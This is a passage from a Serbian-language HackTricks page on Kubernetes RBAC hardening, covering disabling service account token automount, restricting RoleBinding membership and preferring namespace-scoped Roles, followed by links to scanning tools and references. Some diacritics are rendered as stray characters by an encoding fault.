* **Podovi i servisni nalozi**: Podovi podrazumevano montiraju token servisnog naloga. Da biste pobolj코ali bezbednost, Kubernetes omogu캖ava onemogu캖avanje ove funkcije automatskog montiranja.
* **Kako primeniti**: Postavite `automountServiceAccountToken: false` u konfiguraciji servisnih naloga ili podova po캜ev코i od verzije Kubernetes 1.6.

### **Restriktivno dodeljivanje korisnika u RoleBindings/ClusterRoleBindings**

* **Selektivno uklju캜ivanje**: Proverite da su u RoleBindings ili ClusterRoleBindings uklju캜eni samo neophodni korisnici. Redovno vr코ite reviziju i uklanjajte irelevantne korisnike kako biste odr쬬li 캜vrstu bezbednost.

### **Role specifi캜ne za prostor imena umesto globalnih uloga**

* **Role vs. ClusterRoles**: Preporu캜uje se kori코캖enje uloga i RoleBindings za dozvole specifi캜ne za prostor imena umesto ClusterRoles i ClusterRoleBindings, koji se primenjuju globalno. Ovaj pristup nudi precizniju kontrolu i ograni캜ava obim dozvola.

### **Koristite automatizovane alate**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Reference**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od po캜etnika do stru캜njaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
